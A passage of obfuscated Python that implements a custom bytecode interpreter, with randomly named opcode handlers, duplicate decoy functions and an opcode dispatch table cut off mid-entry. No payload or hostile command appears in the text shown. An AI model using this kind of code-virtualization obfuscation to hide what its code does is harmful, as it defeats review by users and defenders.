   attr_idx, argc = arg; name = names[attr_idx]; args = stack[-argc:] if argc > 0 else []
   if argc > 0:
      del stack[-argc:]
   obj = stack.pop(); func = getattr(obj, name)
   if isinstance(func, _types.MethodType) and isinstance(func.__func__, _wv9astx702):
      args = [func.__self__] + list(args); func = func.__func__
   if isinstance(func, _wv9astx702):
      _fl = _grwtfz4o(func.code, args, {}, func.defaults, func.kw_defaults)
      frame._xhsywu9vo = _b0l6wgsgx0(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
   else:
      stack.append(func(*args))
def _xocfc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _t8atlf7i6x = stack.pop(); frame._c61jj55bfr = _t8atlf7i6x; return _RET_SIGNAL
def _xe1f1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._c61jj55bfr = fastlocals[arg]; return _RET_SIGNAL
def _xz437(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _k3q7peb89z = names[arg]; _xdyi0gtnw = locals_dict
   if _k3q7peb89z in _xdyi0gtnw:
      stack.append(_xdyi0gtnw[_k3q7peb89z])
   elif _k3q7peb89z in globals_dict:
      stack.append(globals_dict[_k3q7peb89z])
   elif _k3q7peb89z == 'super':
      def _gjw6jfr7(*args):
         if not args:
            if hasattr(frame, '_zzmhz960') and frame._zzmhz960 and hasattr(frame._zzmhz960, '__class_owner__') and frame._wdtzcyob:
               return _builtins.super(frame._zzmhz960.__class_owner__, frame._wdtzcyob[0])
         return _builtins.super(*args)
      stack.append(_gjw6jfr7)
   elif builtins_dict and _k3q7peb89z in builtins_dict:
      stack.append(builtins_dict[_k3q7peb89z])
   else:
      raise NameError(f"name '{_k3q7peb89z}' is not defined")
def _xwf19(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left >> right)
def _xbebd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left > right)
def _xy770(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if arg == 0:
      stack.append([])
   else:
      items = stack[-arg:]; del stack[-arg:]; stack.append(items)
def _xc784(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if not stack.pop():
      frame._dhcswun8d = arg
def _xi530(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left // right)
def _xfc7c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _q7roeim5f = names[arg]; _juro1jklgl = globals_dict
   if _q7roeim5f in _juro1jklgl:
      _dzwd7s9rz = _juro1jklgl[_q7roeim5f]; stack.append(_dzwd7s9rz)
   elif _q7roeim5f == 'super':
      def _gjw6jfr7(*args):
         if not args:
            if hasattr(frame, '_zzmhz960') and frame._zzmhz960 and hasattr(frame._zzmhz960, '__class_owner__') and frame._wdtzcyob:
               return _builtins.super(frame._zzmhz960.__class_owner__, frame._wdtzcyob[0])
         return _builtins.super(*args)
      stack.append(_gjw6jfr7)
   elif builtins_dict and _q7roeim5f in builtins_dict:
      stack.append(builtins_dict[_q7roeim5f])
   else:
      raise NameError(f"name '{_q7roeim5f}' is not defined")
def _xr1bb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-1] = -stack[-1]
def _xk723(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left + right)
def _xu761(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-2] = stack[-2] + stack[-1]; stack.pop()
def _dp5bd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame is None:
      return None
   return (getattr(frame, '_dhcswun8d', 0) ^ 90) & 255
def _xi8de(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left | right)
def _xia47(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _rbi33r0g48 = stack[-1]; stack[-1] = stack[-2]; stack[-2] = stack[-3]; stack[-3] = _rbi33r0g48
def _xne20(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _ei39es4u0 = stack.pop(); _vzr22mjvjy = stack.pop(); stack.append(_vzr22mjvjy + _ei39es4u0)
def _xu968(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _yu3ywdp7c = stack.pop(); _uth5x2tt8 = stack.pop(); stack.append(_uth5x2tt8 << _yu3ywdp7c)
def _xjf45(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _d0_0 = consts[0]; _d1_0 = _d0_0
   while len(fastlocals) <= 0:
      fastlocals.append(None)
   fastlocals[0] = _d1_0; _n = names[0]
   _d2_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
   _d3_0 = consts[1]; stack.append(_d2_0); stack.append(_d3_0)
def _xt850(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame._d5fzfxc2 is not None:
      frame._d5fzfxc2(None, None, None); frame._d5fzfxc2 = None
def _xj425(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._c61jj55bfr = stack.pop(); return _RET_SIGNAL
def _xt53c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _k3q7peb89z = names[arg]
   if _k3q7peb89z in locals_dict:
      stack.append(locals_dict[_k3q7peb89z])
   elif _k3q7peb89z in globals_dict:
      stack.append(globals_dict[_k3q7peb89z])
   elif _k3q7peb89z == 'super':
      def _gjw6jfr7(*args):
         if not args:
            if hasattr(frame, '_zzmhz960') and frame._zzmhz960 and hasattr(frame._zzmhz960, '__class_owner__') and frame._wdtzcyob:
               return _builtins.super(frame._zzmhz960.__class_owner__, frame._wdtzcyob[0])
         return _builtins.super(*args)
      stack.append(_gjw6jfr7)
   elif builtins_dict and _k3q7peb89z in builtins_dict:
      stack.append(builtins_dict[_k3q7peb89z])
   else:
      raise NameError(f"name '{_k3q7peb89z}' is not defined")
def _xrdc6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   while len(fastlocals) <= arg:
      fastlocals.append(None)
   fastlocals[arg] = stack.pop()
def _xf977(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _d0_0 = stack.pop(); locals_dict[names[0]] = _d0_0; _n = names[1]
   _d1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
   _d2_0 = consts[1]; _d3_1 = _d2_0; _d3_0 = _d1_0; _d3_res = _d3_0 == _d3_1; _d4_cond = _d3_res
   if not _d4_cond:
      frame._dhcswun8d = arg
def _da361(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame is None:
      return None
   return (getattr(frame, '_dhcswun8d', 0) ^ 90) & 255
def _xif0a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
   if cmp_arg == 0:
      res = left < right
   elif cmp_arg == 1:
      res = left <= right
   elif cmp_arg == 2:
      res = left == right
   elif cmp_arg == 3:
      res = left != right
   elif cmp_arg == 4:
      res = left > right
   elif cmp_arg == 5:
      res = left >= right
   elif cmp_arg == 6:
      res = left in right
   elif cmp_arg == 7:
      res = left not in right
   elif cmp_arg == 8:
      res = left is right
   elif cmp_arg == 9:
      res = left is not right
   elif cmp_arg == 10:
      res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
   if not res:
      frame._dhcswun8d = target_pc
def _xwcc8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].add(val)
def _du9f7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame is None:
      return None
   return (getattr(frame, '_dhcswun8d', 0) ^ 90) & 255
def _xh5d2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left in right)
def _xsb50(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _kmlv1qi2 = stack.pop()
   if arg >= len(fastlocals):
      fastlocals.extend([None] * (arg - len(fastlocals) + 1))
   fastlocals[arg] = _kmlv1qi2
def _xu861(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _g9lsmt82 = consts[arg]; stack.append(_g9lsmt82)
def _xx4c9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   args = stack[-arg:] if arg > 0 else []
   if arg > 0:
      del stack[-arg:]
   func = stack.pop()
   if isinstance(func, _types.MethodType) and isinstance(func.__func__, _wv9astx702):
      args = [func.__self__] + list(args); func = func.__func__
   if isinstance(func, _wv9astx702):
      _fl = _grwtfz4o(func.code, args, {}, func.defaults, func.kw_defaults)
      frame._xhsywu9vo = _b0l6wgsgx0(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
   else:
      stack.append(func(*args))
def _xr60a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].append(val)
def _xt41c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _d87ef5ho5 = names[arg]; _zyeu8ilniw = stack.pop(); _p3448zc9a = stack.pop()
   setattr(_zyeu8ilniw, _d87ef5ho5, _p3448zc9a)
def _xqd53(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].extend(val)
def _xscb5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.pop()
def _xzea1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].update(val)
def _xlcc1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   while len(fastlocals) <= arg:
      fastlocals.append(None)
   fastlocals[arg] = stack[-1]
def _xme02(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _tez20ky6f = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _uaob1k66 = stack.pop()
   if isinstance(_uaob1k66, _types.MethodType) and isinstance(_uaob1k66.__func__, _wv9astx702):
      _tez20ky6f = [_uaob1k66.__self__] + list(_tez20ky6f); _uaob1k66 = _uaob1k66.__func__
   if isinstance(_uaob1k66, _wv9astx702):
      _dmi4ccvl = _grwtfz4o(_uaob1k66.code, _tez20ky6f, {}, _uaob1k66.defaults, _uaob1k66.kw_defaults)
      frame._xhsywu9vo = _b0l6wgsgx0(_uaob1k66.code, _uaob1k66.globals_dict, fastlocals=_dmi4ccvl, closure=_uaob1k66.closure, func=_uaob1k66)
   else:
      stack.append(_uaob1k66(*_tez20ky6f))
def _xzd34(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _emvjmj63 = names[arg]; _egjip9a87p = stack.pop(); stack.append(getattr(_egjip9a87p, _emvjmj63))
def _xjcdb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _a2pnrupx = stack.pop(); _k7nm66fy = stack.pop(); stack.append(_k7nm66fy @ _a2pnrupx)
def _xv149(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._dhcswun8d = arg
def _xv146(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _t0_0 = fastlocals[arg]; _t1_1 = _t0_0; _t1_0 = stack.pop(); _t1_res = _t1_0 == _t1_1
   stack.append(_t1_res)
def _xcc57(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if arg == 0:
      stack.append(set())
   else:
      items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xt1dc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg[0]] * consts[arg[1]])
def _xje93(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   globals_dict[names[arg]] = stack.pop()
def _xwbb0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-1] = not stack[-1]
def _xk749(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(getattr(fastlocals[arg[0]], names[arg[1]]))
def _xc411(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left is right)
def _xpaf3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
   if isinstance(func, _types.MethodType) and isinstance(func.__func__, _wv9astx702):
      args = tuple([func.__self__] + list(args)); func = func.__func__
   if isinstance(func, _wv9astx702):
      _fl = _grwtfz4o(func.code, args, kwargs, func.defaults, func.kw_defaults)
      frame._xhsywu9vo = _b0l6wgsgx0(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
   else:
      stack.append(func(*args, **kwargs))
def _xwb11(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg[0]] * fastlocals[arg[1]])
def _xrc5b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); cmp_arg = arg
   if arg == 0:
      stack.append(left < right)
   elif arg == 1:
      stack.append(left <= right)
   elif arg == 2:
      stack.append(left == right)
   elif arg == 3:
      stack.append(left != right)
   elif arg == 4:
      stack.append(left > right)
   elif arg == 5:
      stack.append(left >= right)
   elif arg == 6:
      stack.append(left in right)
   elif arg == 7:
      stack.append(left not in right)
   elif arg == 8:
      stack.append(left is right)
   elif arg == 9:
      stack.append(left is not right)
   elif arg == 10:
      stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xfd67(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   del stack[-1]
def _xy9e2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg[0]] + consts[arg[1]])
def _xlab3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(getattr(stack[-1], names[arg]))
def _xuf6e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if arg == 0:
      stack.append(())
   else:
      items = tuple(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xz4a9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left ^ right)
def _xzccc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._lh35jtd7rf.append(_sc86bahd(_fy7vv2tw8.FINALLY, arg, len(stack)))
def _xid33(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(frame._tu8d9y10b[arg].val)
def _xvb4c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if arg == 0:
      raise
   elif arg == 1:
      raise stack.pop()
   elif arg == 2:
      cause = stack.pop(); exc = stack.pop(); raise exc from cause
def _xw447(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _zkijhyvtl = stack.pop(); _gp40wby4eb = stack.pop(); stack.append(_gp40wby4eb - _zkijhyvtl)
def _xm420(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left % right)
def _xyb80(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-2] = stack[-2] - stack[-1]; stack.pop()
def _xm34e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _b_0_0 = stack.pop()
   while len(fastlocals) <= 1:
      fastlocals.append(None)
   fastlocals[1] = _b_0_0; _b_1_0 = fastlocals[1]; stack.append(_b_1_0)
def _xdbe4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _ib549h4yew = stack.pop(); _i7l5229p6 = stack.pop(); del _i7l5229p6[_ib549h4yew]
def _xq8cd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   pass
def _xjd36(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left < right)
def _xk133(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(stack[-1])
def _xq974(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _zdrs51ta = stack.pop(); _oyym0snycb = stack.pop(); stack.append(_oyym0snycb & _zdrs51ta)
def _xg6b0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-1], stack[-2] = (stack[-2], stack[-1])
def _xr213(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if stack[-1]:
      frame._dhcswun8d = arg
def _xx8ea(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _sj9g17biw = stack.pop(); _gim5y8qpl = stack.pop(); stack.append(_gim5y8qpl ** _sj9g17biw)
def _xj743(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left <= right)
def _xta3c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   fastlocals[arg] = None
def _xb7e1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _y9u10wuo = names[arg]; _iyhlmz91 = stack.pop(); delattr(_iyhlmz91, _y9u10wuo)
def _xe7d5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _xj6m68zs = stack.pop(); _feeccqcb = stack.pop(); stack.append(_feeccqcb >> _xj6m68zs)
def _xgac8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _roii7t9gr = stack.pop(); globals_dict[names[arg]] = _roii7t9gr
def _xlb83(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   while len(fastlocals) <= arg[1]:
      fastlocals.append(None)
   fastlocals[arg[1]] = fastlocals[arg[0]]
def _xo9a5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left is not right)
def _xmb2f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left != right)
def _xzc78(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left not in right)
def _xqe1c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   pass
def _xwfbf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _ygjsjayg = stack.pop(); locals_dict[names[arg]] = _ygjsjayg
def _xp745(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left >= right)
def _de874(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame is None:
      return None
   return (getattr(frame, '_dhcswun8d', 0) ^ 90) & 255
def _xkbde(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   locals_dict[names[arg]] = stack.pop()
def _xoa48(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg[0]] - consts[arg[1]])
def _xt537(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._tu8d9y10b[arg].val = stack.pop()
def _xtf88(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _n = names[arg[0]]
   _d0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
   _d1_0 = consts[arg[1]]; stack.append(_d0_0); stack.append(_d1_0)
def _xg2ac(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   mod = stack.pop()
   if hasattr(mod, '__all__'):
      for k in mod.__all__:
         locals_dict[k] = getattr(mod, k)
   else:
      for k, v in mod.__dict__.items():
         if not k.startswith('_'):
            locals_dict[k] = v
def _xla22(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); cmp_arg = arg
   if arg == 0:
      stack.append(not left >= right)
   elif arg == 1:
      stack.append(not left > right)
   elif arg == 2:
      stack.append(not left != right)
   elif arg == 3:
      stack.append(not left == right)
   elif arg == 4:
      stack.append(not left <= right)
   elif arg == 5:
      stack.append(not left < right)
   elif arg == 6:
      stack.append(left in right)
   elif arg == 7:
      stack.append(not left in right)
   elif arg == 8:
      stack.append(left is right)
   elif arg == 9:
      stack.append(not left is right)
   elif arg == 10:
      stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xwe7b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
def _xr641(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left / right)
def _xd85f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _zy0rwsqmo = names[arg]
   if _zy0rwsqmo in globals_dict:
      del globals_dict[_zy0rwsqmo]
   else:
      raise NameError(f"name '{_zy0rwsqmo}' is not defined")
def _xk1a1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
   import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
   stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
def _xc916(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left ** right)
def _xdbac(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left << right)
def _xa9a3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left * right)
def _xna27(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   d = {}
   if arg > 0:
      pairs = stack[-2 * arg:]; del stack[-2 * arg:]
      for i in range(0, len(pairs), 2):
         d[pairs[i]] = pairs[i + 1]
   stack.append(d)
def _xv1ce(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _x12e0ma8 = stack.pop(); _p27w7jiwz0 = stack.pop(); stack.append(_p27w7jiwz0 % _x12e0ma8)
def _xt7df(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _hfjtg7jrt5 = stack.pop(); _ir7x4rwo1 = stack.pop(); _wj6xc0q3 = stack.pop()
   _ir7x4rwo1[_hfjtg7jrt5] = _wj6xc0q3
def _xlfbf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _phj4k3fj = stack.pop(); _pb446z2an = stack.pop(); stack.append(_pb446z2an[_phj4k3fj])
def _xl716(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.extend(stack[-2:])
def _xe1e5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(consts[arg])
def _xu7ff(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _e29h2iasbw = stack.pop(); _w5p7mco5l6 = stack.pop(); stack.append(_w5p7mco5l6 ^ _e29h2iasbw)
def _xa67a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left @ right)
def _xte20(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-1] = ~stack[-1]
def _xl2bf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   def _a29c0kyv(func, name, *bases, **kwds):
      meta = kwds.get('metaclass')
      if meta is None:
         meta = type(bases[0]) if bases else type
      ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
      if hasattr(func, 'execute_with_locals'):
         func.execute_with_locals(ns)
      else:
         func()
      cls = meta(name, bases, ns, **kwds)
      for item in ns.values():
         if hasattr(item, '__code__'):
            item.__class_owner__ = cls
      return cls
   stack.append(_a29c0kyv)
def _xs848(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(fastlocals[arg])
def _xrd08(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left & right)
def _xza19(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._c61jj55bfr = consts[arg]; return _RET_SIGNAL
def _xxb55(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if not stack[-1]:
      frame._dhcswun8d = arg
def _xt656(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if stack.pop():
      frame._dhcswun8d = arg
def _xuda2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _kuzueubpjk = stack.pop(); _fgkdg8th8u = stack.pop(); stack.append(_fgkdg8th8u // _kuzueubpjk)
def _xoc1a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   seq = list(stack.pop())
   if len(seq) != arg:
      raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
   for item in reversed(seq):
      stack.append(item)
def _xqa4c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop(); key = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
   stack[-depth][key] = val
def _xla82(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _hxs8syr86 = arg; frame._dhcswun8d = _hxs8syr86
_dT_c261 = {59007: _xr641, 62667: _xw447, 64232: _xfc7c, 62067: _xq974, 65397: _xp745, 58599: _xw25f, 63699: _xzd34, 64737: _xu761, 62458: _xla22, 62848: _xwbb0, 65392: _xt7df, 63701: _xt41c, 62950: _xlf36, 64589: _xo9a5, 64965: _xwfbf, 61962: _xxb55, 59234: _xv370, 64676: _xb9df, 58621: _xoc1a, 58580: _xce75, 62995: _xkbde, 63979: _xk1a1, 65297: _xw46b, 63796: _xtfdf, 58863: _xme02, 62949: _xm774, 62564: _xscb5, 63115: _da361, 61664: _xv146, 64266: _xje93, 63474: _xuf6e, 62923: _xz5f9, 64238: _xy770, 58831: _xh5d2, 64517: _xf60e, 62331: _xi530, 65183: _xlb83, 58912: _xx4c9, 63990: _xrdc6, 65424: _xsb50, 58918: _dp5bd, 63723: _xgac8, 65280: _xvb4c, 59068: _xne20, 64518: _xe1f1, 64794: _xlab3, 59198: _xs848, 61728: _xj425, 58759: _xm420, 63891: _xpaf3, 64387: _xmb2f, 63993: _xa9a3, 61681: _xu426, 62998: _xzea1, 59119: _xia47, 62982: _xd85f, 61906: _xr1bb, 62215: _xlcc1, 64189: _xjd36, 65398: _xg32d, 63041: _xt53c, 61697: _xza19, 62798: _xl2bf, 63391: _xy1b3, 59222: _xj425, 61457: _xla82, 62708: _xj743, 61940: _xz4a9, 59039: _xrc5b, 62079: _xx8ea, 64061: _xt412, 58856: _xdbac, 65016: _xwf19, 62151: _xrd08, 58775: _xnff3, 62052: _xf977, 64234: _xl499, 59176: _xdbe4, 62551: _xk723, 63667: _xwe7b, 65432: _xfd67, 65450: _xt53c, 58907: _xb8dd, 62509: _du9f7, 62326: _xrdc6, 62402: _xade1, 64610: _xc411, 63982: _xwb11, 61506: _xt1dc, 65175: _xl716, 64725: _xt656, 63005: _xt850, 63851: _xscb5, 59205: _xsbbe, 58591: _xi8de, 63147: _xr213, 65024: _xc784, 58781: _xu81b, 58685: _xqe1c, 63488: _xw447, 58521: _xx4c9, 63606: _xu861, 62641: _xuda2, 64481: _xm34e, 58904: _xzc78, 64987: _xb7e1, 58738: _xm33b, 63872: _xnff3, 61731: _xg2ac, 63674: _xk749, 65196: _xe1e5, 62921: _xv149, 63505: _xr50b, 58743: _xv149, 58563: _xa67a, 64505: _xte20, 64416: _xoa48, 64798: _xocfc, 64164: _xu7ff, 62150: _xuca9, 63695: _de874, 58385: _xid33, 63727: _xzffd, 58806: _xqa4c, 63856: _xe1e5, 62651: _xlfbf, 64606: _xif0a, 62819: _de874, 62411: _xcc57, 65457: _xkbde, 65087: _xjcdb, 62055: _xje93, 62806: _xne20, 62508: 